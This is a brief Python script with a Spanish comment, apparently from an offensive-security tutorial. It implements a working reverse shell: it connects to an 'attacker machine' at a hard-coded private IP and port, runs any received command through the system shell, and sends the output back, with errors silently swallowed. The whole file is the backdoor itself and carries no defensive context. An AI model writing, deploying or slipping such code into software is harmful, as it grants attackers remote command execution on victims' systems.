import socket
import subprocess

client = socket.socket()

try:
    client.connect(('192.168.1.65', 8080)) # Volvemos a poner la IP de nuestra máquina atacante donde se conectará a la víctima.
    client.send("1".encode("ascii"))

    while True:
        comandoBytes = client.recv(1024)
        comandoCodificado = comandoBytes.decode("ascii")
        comando = subprocess.Popen(comandoCodificado, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        client.send(comando.stdout.read())
except:
    pass
